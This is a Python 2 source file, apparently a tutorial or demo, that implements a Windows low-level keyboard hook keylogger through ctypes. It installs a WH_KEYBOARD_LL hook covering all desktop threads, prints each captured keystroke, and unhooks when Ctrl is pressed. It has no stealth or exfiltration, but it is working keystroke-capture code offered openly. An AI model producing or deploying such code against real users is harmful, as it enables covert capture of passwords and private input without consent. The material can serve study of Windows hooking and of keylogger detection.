import sys
from ctypes import *
from ctypes.wintypes import MSG

user32 = windll.user32
kernel32 = windll.kernel32
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162


class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        # https://msdn.microsoft.com/ru-ru/library/windows/desktop/ms644990(v=vs.85).aspx
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,               # _In_ int idHook = The type of hook procedure to be installed. Tabled values
            pointer,                          # _In_ HOOKPROC lpfn = A pointer to the hook procedure
            kernel32.GetModuleHandleW(None),  # _In_ HINSTANCE hMod = A handle to the DLL containing the hook procedure
                                              #                        pointed to by the lpfn parameter
                                              # GetModuleHandleW(None) retrieves a module handle for our module
            0  # _In_ DWORD dwThreadId = if this parameter is zero, the hook procedure is associated with all existing
               # threads running in the same desktop as the calling thread
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    print hookedKey
    if (CTRL_CODE == int(lParam[0])):
        print "Ctrl pressed, call uninstallHook()"
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg),0,0,0)

keyLogger = KeyLogger()
puk = getFPTR
pointer = getFPTR(hookProc)
if keyLogger.installHookProc(pointer):
    print "installed keyLogger"
startKeyLog()
